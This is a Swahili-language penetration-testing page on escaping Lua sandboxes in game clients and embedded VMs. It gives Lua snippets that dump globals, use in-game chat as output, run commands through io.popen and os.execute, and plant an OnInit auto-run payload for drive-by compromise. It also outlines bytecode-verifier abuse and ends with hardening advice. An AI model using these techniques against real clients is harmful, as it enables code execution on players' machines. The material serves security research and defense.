# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ukurasa huu unakusanya mbinu za vitendo za kuchunguza na kutoroka kutoka kwenye Lua "sandboxes" zilizopachikwa kwenye applications (hasa game clients, plugins, au scripting engines za ndani ya application). Engines nyingi huonyesha mazingira ya Lua yenye vizuizi, lakini huacha globals zenye nguvu zikiwa zinaweza kufikiwa, hivyo kuwezesha utekelezaji wa amri kiholela au hata uharibifu wa native memory wakati bytecode loaders zinafikiwa.

Mawazo muhimu:
- Ichukulie VM kama mazingira yasiyojulikana: chunguza _G na gundua ni primitives gani hatari zinaweza kufikiwa.
- Wakati stdout/print imezuiwa, tumia vibaya channel yoyote ya UI/IPC iliyo ndani ya VM kama output sink ili kuona matokeo.
- Ikiwa io/os imewekwa wazi, mara nyingi unapata command execution ya moja kwa moja (io.popen, os.execute).
- Ikiwa load/loadstring/loadfile imewekwa wazi, kutekeleza Lua bytecode iliyoundwa mahsusi kunaweza kuvuruga memory safety katika baadhi ya versions (verifiers za ≤5.1 zinaweza bypass; 5.2 iliondoa verifier), na kuwezesha advanced exploitation.

## Chunguza mazingira ya sandbox

- Dump global environment ili kuorodhesha tables/functions zinazoweza kufikiwa:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ikiwa print() haipatikani, tumia upya channels za in-VM. Mfano kutoka kwenye VM ya script ya housing ya MMO ambapo chat output hufanya kazi tu baada ya sound call; ifuatayo huunda output function inayotegemeka:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalize muundo huu kwa target yako: textbox, toast, logger, au UI callback yoyote inayokubali strings inaweza kutumika kama stdout kwa reconnaissance.

## Direct command execution ikiwa io/os imewekwa wazi

Ikiwa sandbox bado inatoa ufikiaji wa standard libraries io au os, huenda ukawa na command execution mara moja:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Maelezo:

- Utekelezaji hufanyika ndani ya client process; layers nyingi za anti-cheat/antidebug zinazozuia debuggers za nje hazitazuia uundaji wa process ndani ya VM.
- Pia kagua: package.loadlib (upakiaji wa DLL/.so kiholela), require yenye native modules, ffi ya LuaJIT (ikiwa ipo), na debug library (inaweza kuongeza privileges ndani ya VM).

## Vichochezi vya zero-click kupitia auto-run callbacks

Ikiwa host application inasukuma scripts kwa clients na VM inafichua auto-run hooks (k.m., OnInit/OnLoad/OnEnter), weka payload yako hapo ili kufanya drive-by compromise mara tu script inapopakiwa:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Callback yoyote inayolingana (OnLoad, OnEnter, n.k.) huifanya technique hii itumike kwa jumla wakati scripts zinapotumwa na kutekelezwa kwenye client kiotomatiki.

## Dangerous primitives za kutafuta wakati wa recon

Wakati wa ku-enumerate _G, tafuta hasa:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: hutekeleza source au bytecode; inaunga mkono kupakia bytecode isiyoaminika.
- package, package.loadlib, require: dynamic library loading na module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, na hooks.
- LuaJIT-only: ffi.cdef, ffi.load za kuita native code moja kwa moja.

Mifano midogo ya matumizi (ikiwa inafikika):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalation ya hiari: kutumia vibaya Lua bytecode loaders

Wakati load/loadstring/loadfile zinapatikana lakini io/os zimewekewa vizuizi, utekelezaji wa Lua bytecode iliyoundwa mahsusi unaweza kusababisha primitives za kufichua na kuharibu memory. Mambo muhimu:
- Lua ≤ 5.1 ilisafirishwa ikiwa na bytecode verifier yenye bypasses zinazojulikana.<sup>[[4]](#references)</sup>
- Lua 5.2 iliondoa verifier kabisa (msimamo rasmi: applications zinapaswa kukataa tu precompiled chunks), hivyo kupanua attack surface ikiwa bytecode loading haijazuiwa.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows kwa kawaida huwa: kuvuja pointers kupitia in-VM output, kuunda bytecode inayosababisha type confusions (kwa mfano, kuzunguka FORLOOP au opcodes nyingine), kisha kugeukia arbitrary read/write au native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Njia hii inategemea engine/version na inahitaji RE. Tazama references kwa uchambuzi wa kina, exploitation primitives, na mfano wa gadgetry katika games.

## Maelezo ya detection na hardening (kwa defenders)

- Server side: kataa au andika upya user scripts; tumia allowlist ya safe APIs; ondoa au funga kwa empty binding io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: endesha Lua kwa minimal _ENV, kataza bytecode loading, reintroduce strict bytecode verifier au signature checks, na zuia process creation kutoka client process.
- Telemetry: toa alert wakati gameclient → child process creation inatokea muda mfupi baada ya script load; korelate na UI/chat/script events.

## References

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
